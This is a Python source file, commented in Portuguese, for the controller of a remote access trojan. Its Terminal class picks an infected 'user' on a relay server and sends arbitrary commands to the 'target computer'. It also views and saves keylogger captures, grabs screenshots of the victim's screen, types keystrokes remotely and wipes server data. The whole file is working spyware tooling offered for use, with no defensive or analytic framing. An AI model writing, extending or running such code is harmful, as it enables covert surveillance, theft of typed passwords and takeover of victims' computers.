from PIL import Image
from pyperclip import copy
from terminal.help import info
from terminal.functions import *
import base64
import io
import keyboard
import os
import random
import subprocess
import sys
import time


class Terminal(object):

    __code = 0
    __stop = True
    __username = None

    info = ""
    output = ""

    destroy_url = ""
    input_url = ""
    output_url = ""
    keylogger_url = ""


    def __init__(self, host = "localhost"):

        self.__server = host
        self.destroy_url = format_url(destroy_url = self.__server)
        self.menu_url = format_url(menu_url = self.__server)

        self.__commands = {
            "activate": lambda args: self.change_status(True),
            "copy": lambda args: copy(self.output),
            "clear": lambda args: self.clear_screen(),
            "destroy": lambda args: self.destroy(),
            "help": lambda args: self.help(),
            "keylogger": lambda args: self.show_keys(),
            "print": lambda args: self.print_screen(),
            "save": lambda args: self.save_keys(),
            "select": lambda user: self.change_user(user),
            "stop": lambda args: self.change_status(False),
            "user": lambda args: print("", self.__username),
            "users": lambda args: self.show_users(),
            "write": lambda text: self.write(text)
            }

        keyboard.on_press_key("q", self.stop)


    def change_status(self, status):

        """
        Ativa ou desativa o envio de teclas.
        """

        if not self.hasUser(): return  
      
        self.output = self.send("#self.activate()") if status else self.send("#self.stop()")
        print(" " + self.output)


    def change_user(self, user):

        """
        Seleciona um usuário.
        """

        # Verifica se o nome é válido.
        if not user in get_users(self.menu_url):
            return print(" " + user, "does not exists.") 

        # Define o usuário selecionado e as urls.
        self.input_url = format_url(input_url = self.__server + "/" + user)
        self.keylogger_url = format_url(keylogger_url = self.__server + "/" + user)
        self.output_url = format_url(output_url = self.__server + "/" + user)
        self.__username = user


    def clear_screen(self):

        """
        Limpa o terminal.
        """

        if "win" in sys.platform: os.system("cls")
        else: os.system("clear")


    def destroy(self):

        """
        Apaga todos os dados do servidor.
        """
        
        send(url = self.destroy_url, text = "True")


    def get_code(self):

        """
        Retorna um código.
        """

        self.__code += random.randint(1, 9)
        return self.__code


    def hasUser(self):

        """ 
        Verifica se um usuário foi selecionado.
        """

        if self.__username: return True
        print(" No users were selected.")


    def help(self):

        """
        Imprime texto de ajuda.
        """

        print(self.info)


    def print_screen(self):

        """
        Obtém imagem da tela do computador alvo.
        """

        if not self.hasUser(): return

        # Obtém os bytes da imagem.
        output = self.send("#self.print_screen()")
        image_data = base64.b64decode(output)

        # Mostra a imagem.
        image = Image.open(io.BytesIO(image_data))
        image.show()


    def run(self):

        """
        Inicializa o terminal.
        """

        while True:

            # Obtém o comando do usuário.
            command = input("\n In: ")
            print("")
            
            if not command: continue

            # Verifica se o input é um comando pré-definido.
            if command.split(" ", maxsplit = 1)[0].lower() in self.__commands:
                command = command.split(" ", maxsplit = 1)
                self.__commands[command[0].lower()](command[-1])
                continue
            
            # Verifica se é um comando de terminal do próprio usuário.
            elif not command[0] in "$#&":
                self.output = str(subprocess.getoutput(command))
                print(self.output)
                continue

            # Verifica se um usuário foi selecionado.
            elif not self.__username:
                print(" No users were selected.")
                continue

            # Envia um comando para o computador alvo.
            self.output = self.send(command) 
            print(" " + self.output)


    def save_keys(self):

        """
        Salva as teclas pressionadas em um arquivo de texto.
        """

        if not self.hasUser(): return

        chars = 0

        with open("keys_%s.txt" % self.__username, "w") as file:

            # Percorre todas as chaves e as escreve dentro do arquivo.
            for key in get_keys(self.keylogger_url):

                file.write(key + " ")
                chars += len(key)

                # Limita cada linha a apenas 60 caracteres.
                if chars >= 60: 
                    file.write("\n")
                    chars = 0


    def send(self, command):

        """
        Envia comando para ser executado no computador alvo.
        """

        # Obtém um novo código para o envio.
        code = self.get_code()

        # Envia o comando.
        send(url = self.input_url, text = str(code) + ":" + command)

        r_code = -1

        # Espera pela resposta que possui o mesmo código do envio.
        while int(r_code) != code:
            output = get_content(self.output_url)
            
            if ":" in output:
                r_code, output = output.split(":", maxsplit = 1)

        # Retorna a resposta obtida.
        return output


    def show_keys(self):

        """
        Mostra as teclas pressionadas pelo usuário.
        """

        if not self.hasUser(): return

        self.__stop = False

        while not self.__stop:

            # Obtém todas as teclas pressionadas.
            keys = get_keys(self.keylogger_url, wait = False)
            self.clear_screen()

            # Percorre todas as teclas e as imprime.
            for key in keys:
                print(" "+ key, end = "")
                if key.lower() == "enter": print("")

            print("")
            time.sleep(0.1)


    def show_users(self):

        """
        Mostra todos os usuários do servidor.
        """

        users = get_users(self.menu_url)
        for user in users: print(" " + user)


    def stop(self, key = None):

        """
        Interrompe um evento.
        """

        self.__stop = True


    def write(self, text):

        """
        Escreve um texto no computador alvo.

        O caractere especial <enter> serve para a tecla ENTER
        ser apertada no computador alvo.
        """

        if not self.hasUser(): return  

        keys = []
        
        # Percorre todos os caracteres do texto.
        for char in text.replace("<enter>", "\n"):
            
            if char == "\n": char = "enter"
            keys.append(char)

        # Envia o comando.
        self.output = self.send("#pyautogui.press({})".format(keys))
        print(" " + self.output)


Terminal.info = info
